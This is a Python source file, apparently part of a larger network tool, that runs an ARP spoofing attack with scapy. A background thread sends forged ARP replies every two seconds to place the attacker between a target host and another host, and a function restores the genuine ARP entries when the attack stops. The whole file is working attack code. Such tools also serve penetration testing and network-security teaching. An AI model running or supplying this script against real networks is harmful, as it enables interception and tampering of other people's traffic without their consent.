from scapy.all import ARP, send
import time, threading
from models.host import Host

spoof_thread = None
stop_thread = False

def start_arp_spoofing_process(target: Host, host: Host):
    global spoof_thread, stop_thread
    stop_thread = False
    spoof_thread = threading.Thread(target=arp_spoof, args=(target, host))
    spoof_thread.start()

def stop_arp_spoofing_process(target: Host, host: Host):
    global spoof_thread, stop_thread
    if spoof_thread is not None:
        stop_thread = True
        spoof_thread.join()  # Wait for the thread to finish
        spoof_thread = None
        restore(host.ip, target.ip, host.mac, target.mac)
        restore(target.ip, host.ip, target.mac, host.mac)

def arp_spoof(target: Host, host: Host):
    try:
        sent_packets_count = 0
        while not stop_thread:
            send_spoofed_arp_packet(target.ip, host.ip, target.mac)
            send_spoofed_arp_packet(host.ip, target.ip, host.mac)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(host.ip, target.ip, host.mac, target.mac)
        restore(target.ip, host.ip, target.mac, host.mac)
        print("[+] Arp Spoof Stopped")


def restore(destination_ip: str, source_ip: str, destination_mac: str, source_mac: str):
    packet = ARP(op = 2, pdst = destination_ip,
                         hwdst = destination_mac,
                         psrc = source_ip,
                         hwsrc = source_mac)

    send(packet, verbose = False)

def send_spoofed_arp_packet(ip: str, spoof_ip: str, mac: str):
    packet = ARP(op = 2, pdst = ip, hwdst = mac, psrc = spoof_ip)
    send(packet, verbose = False)